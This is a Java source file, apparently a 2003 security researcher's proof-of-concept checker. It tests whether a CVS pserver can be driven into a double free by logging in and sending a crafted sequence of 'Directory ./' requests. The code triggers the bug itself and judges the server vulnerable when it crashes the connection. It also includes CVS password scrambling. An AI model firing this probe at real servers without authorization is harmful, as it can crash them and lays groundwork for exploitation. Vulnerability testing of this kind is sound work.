/**
 * This program tests a CVS server to see if it can be tricked into calling
 *     free() on a memory block twice.  Here is the basic theory of operation:
 *     1.) a basic request is first sent to the server, so that its 'dir_name'
 *         variable is set (see the 'dirswitch' function in server.c).
 *     2.) a request is made using the directory, './', which causes
 *         'dir_name' to be free()d without being re-set before 'dirswitch' is
 *         left.
 *     3.) a 'status' request is made to clear the server's error flags.
 *     4.) another basic request is made, and dir_name is free()ed twice.
 *     5.) steps 1-4 are repeated, and server calls free() for a *third* time
 *         on 'dir_name'.
 *
 *
 * I tested this against a CVS pserver running on Linux (Trustix 1.5, to be
 *     exact).  I don't know if this works against *BSD, AIX, or other UNIX
 *     variants.  Drop me a line at <jtesta@rapid7.com> and let me know what
 *     happens on these platforms.  Thanks!
 *
 * Oh, and keep in mind while looking at this code that I've had no experience
 *     with the CVS protocol until seeing it from Ethereal.  So there are some
 *     weird parts and other ugly bits around...
 *
 * Licensed under the GNU Public License v2.0!
 *
 *
 * @author    Joe Testa
 *
 * @version   $Id: CVSProber.java,v 1.4 2003/01/24 14:55:52 jdog Exp $
 *
 *
 * Revisions:
 *            $Log: CVSProber.java,v $
 *            Revision 1.4  2003/01/24 14:55:52  jdog
 *            Added more comments, password routine.
 *
 *            Revision 1.3  2003/01/23 22:23:18  jdog
 *            Cleanups & optimizations.
 *
 *            Revision 1.2  2003/01/23 22:03:26  jdog
 *            Now functional.
 *
 *            Revision 1.1  2003/01/23 13:21:56  jdog
 *            Initial revision
 *
 */

import java.net.Socket;
import java.io.PrintWriter;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;

public class CVSProber {


    public static Socket socket = null;
    public static PrintWriter printWriter = null;
    public static BufferedReader bufferedReader = null;
    public static String cvsRoot = null;


    public static void main( String args[] ) {


        // Password is optional.
        if ( args.length != 3 && args.length != 4 ) {
            System.err.println( "Usage:  java CVSProber IP_address login " + 
                                "[password] cvs_root\n" );
            System.err.println( "Example:  java CVSProber 192.168.1.5 jdog " +
                                "chad0wnzMe /cvs" );
            System.err.println( "          java CVSProber 192.168.1.5 " +
                                "anonymous /cvs" );
            System.exit( 666 );
        }


        String ipAddress = args[ 0 ];
        String name = args[ 1 ];
        String password = null;
        if ( args.length == 3 ) {
            cvsRoot = args[ 2 ];
            password = "A";       // A blank CVS password is simply 'A'.
        } else {
            cvsRoot = args[ 3 ];
            password = convertPassword( args[ 2 ] );
        }



        try {

            System.out.print( "Connecting..." );
            socket = new Socket( ipAddress, 2401 );
            System.out.println( "connected." );


            printWriter = new PrintWriter( socket.getOutputStream(), true );
            bufferedReader = new BufferedReader( new InputStreamReader(
                    socket.getInputStream() ) );


            login( name, password );
            init();


            doOperation( ".", "expand-modules" );

            if ( !allGood() )
                shutdown( "Error while expanding modules!" );

            doOperation( "./", "expand-modules" );
            allGood();


            doOperation( ".", "status" );
            bufferedReader.readLine();
            if ( !bufferedReader.readLine().equals( "error  " ) )
                shutdown( "server didn't return an error when it should've!" );


            doOperation( ".", "expand-modules" );
	    allGood();


            doOperation( "./", "expand-modules" );
            allGood();


            doOperation( ".", "status" );
	    bufferedReader.readLine();
            if ( !bufferedReader.readLine().equals( "error  " ) )
                shutdown( "server didn't return an error when it should've!" );

            doOperation( "./", "expand-modules" );

            String test = bufferedReader.readLine();
            if ( test == null ) {
                System.out.println( "Server killed the connection and thus " +
                                    "appears to be vulnerable!" );
            } else if ( test.equals( "ok" ) ) {
                System.out.println( "Server responded with 'ok', which " +
                                    "means that it is not vulnerable." );
            } else {
                // I've never run across this case during my testing with the
                //     official CVS server...
                System.out.println( "After corrupt input was sent, server " +
                                    "returned this: '" + test + "'.  Who " +
                                    "knows what _that_ means!" );
            }



        } catch( Exception e ) {
            System.err.println( "Exception: " + e.getMessage() );
        } finally {
            shutdown( "Probe completed." );
        }


    }


    static void login( String login, String password ) throws IOException {


        write( "BEGIN AUTH REQUEST" );
        write( cvsRoot );
        write( login );
        write( password );
        write( "END AUTH REQUEST" );

        String lovesMeOrLovesMeNot = bufferedReader.readLine();
        if ( !lovesMeOrLovesMeNot.equals( "I LOVE YOU" ) )
            shutdown( "No love from the server! " +
                      "(this means that the login failed.)" );


    }


    static void init() throws IOException {

        String result = null;
        write( "Root " + cvsRoot );


        // This is what the legitimate CVS client sends...
        write( "Valid-responses ok error Valid-requests Checked-in New-entry Checksum Copy-file Updated Created Update-existing Merged Patched Rcs-diff Mode Mod-time Removed Remove-entry Set-static-directory Clear-static-directory Set-sticky Clear-sticky Template Set-checkin-prog Set-update-prog Notified Module-expansion Wrapper-rcsOption M Mbinary E F MT" );



        write( "valid-requests" );

        // Read the long response & the ending 'ok'.
        if ( ( bufferedReader.readLine() == null ) || !allGood() )
            shutdown( "Error while initializing!" );



    }


    // This issues commands that require the 'Directory' directive, which
    //     is essential to this vulnerability.
    private static void doOperation( String directory, String command )
                                     throws IOException {

        write( "Directory " + directory );
        write( cvsRoot );
        write( command );

    }


    // CVS commands that are successful return 'ok'.
    private static boolean allGood() throws IOException {

        String result = bufferedReader.readLine();
        if ( result.equals( "ok" ) )
            return true;
        else
            return false;

    }


    // Commands to the CVS server all end in 0x0a.
    private static void write( String string ) {
        printWriter.print( string );
        printWriter.print( "\12" );
        printWriter.flush();
    }


    // Print a final message, then close the socket & streams and terminate.
    private static void shutdown( String message ) {

        System.out.println( message );

        if ( printWriter != null )
            try { printWriter.close(); } catch( Exception e ) {}
        if ( bufferedReader != null )
            try { bufferedReader.close(); } catch( Exception e ) {}
        if ( socket != null )
            try { socket.close(); } catch( Exception e ) {}

        System.exit( 666 );
    }



    // I never knew that CVS's password hashing algorithm was *this* lame...
    private static String convertPassword( String original ) {

        String retVal = "A";
        char pwmap[] = new char[ 256 ];

        pwmap[ '!' ] = (char)120;
        pwmap[ '\"' ] = (char)53;
        pwmap[ '%' ] = (char)109;
        pwmap[ '&' ] = (char)72;
        pwmap[ '\'' ] = (char)108;
        pwmap[ '(' ] = (char)70;
        pwmap[ ')' ] = (char)64;
        pwmap[ '*' ] = (char)76;
        pwmap[ '+' ] = (char)67;
        pwmap[ ',' ] = (char)116;
        pwmap[ '-' ] = (char)74;
        pwmap[ '.' ] = (char)68;
        pwmap[ '/' ] = (char)87;
        pwmap[ '0' ] = (char)111;
        pwmap[ '1' ] = (char)52;
        pwmap[ '2' ] = (char)75;
        pwmap[ '3' ] = (char)119;
        pwmap[ '4' ] = (char)49;
        pwmap[ '5' ] = (char)34;
        pwmap[ '6' ] = (char)82;
        pwmap[ '7' ] = (char)81;
        pwmap[ '8' ] = (char)95;
        pwmap[ '9' ] = (char)65;
        pwmap[ ':' ] = (char)112;
        pwmap[ ';' ] = (char)86;
        pwmap[ '<' ] = (char)118;
        pwmap[ '=' ] = (char)110;
        pwmap[ '>' ] = (char)122;
        pwmap[ '?' ] = (char)105;
        pwmap[ 'A' ] = (char)57;
        pwmap[ 'B' ] = (char)83;
        pwmap[ 'C' ] = (char)43;
        pwmap[ 'D' ] = (char)46;
        pwmap[ 'E' ] = (char)102;
        pwmap[ 'F' ] = (char)40;
        pwmap[ 'G' ] = (char)89;
        pwmap[ 'H' ] = (char)38;
        pwmap[ 'I' ] = (char)103;
        pwmap[ 'J' ] = (char)45;
        pwmap[ 'K' ] = (char)50;
        pwmap[ 'L' ] = (char)42;
        pwmap[ 'M' ] = (char)123;
        pwmap[ 'N' ] = (char)91;
        pwmap[ 'O' ] = (char)35;
        pwmap[ 'P' ] = (char)125;
        pwmap[ 'Q' ] = (char)55;
        pwmap[ 'R' ] = (char)54;
        pwmap[ 'S' ] = (char)66;
        pwmap[ 'T' ] = (char)124;
        pwmap[ 'U' ] = (char)126;
        pwmap[ 'V' ] = (char)59;
        pwmap[ 'W' ] = (char)47;
        pwmap[ 'X' ] = (char)92;
        pwmap[ 'Y' ] = (char)71;
        pwmap[ 'Z' ] = (char)115;
        pwmap[ '_' ] = (char)56;
        pwmap[ 'a' ] = (char)121;
        pwmap[ 'b' ] = (char)117;
        pwmap[ 'c' ] = (char)104;
        pwmap[ 'd' ] = (char)101;
        pwmap[ 'e' ] = (char)100;
        pwmap[ 'f' ] = (char)69;
        pwmap[ 'g' ] = (char)73;
        pwmap[ 'h' ] = (char)99;
        pwmap[ 'i' ] = (char)63;
        pwmap[ 'j' ] = (char)94;
        pwmap[ 'k' ] = (char)93;
        pwmap[ 'l' ] = (char)39;
        pwmap[ 'm' ] = (char)37;
        pwmap[ 'n' ] = (char)61;
        pwmap[ 'o' ] = (char)48;
        pwmap[ 'p' ] = (char)58;
        pwmap[ 'q' ] = (char)113;
        pwmap[ 'r' ] = (char)32;
        pwmap[ 's' ] = (char)90;
        pwmap[ 't' ] = (char)44;
        pwmap[ 'u' ] = (char)98;
        pwmap[ 'v' ] = (char)60;
        pwmap[ 'w' ] = (char)51;
        pwmap[ 'x' ] = (char)33;
        pwmap[ 'y' ] = (char)97;
        pwmap[ 'z' ] = (char)62;



        for( int i = 0; i < original.length(); i++ ) {
            retVal += ( pwmap[ original.charAt( i ) ] );
        }

        return retVal;
    }


}  // CVSProber
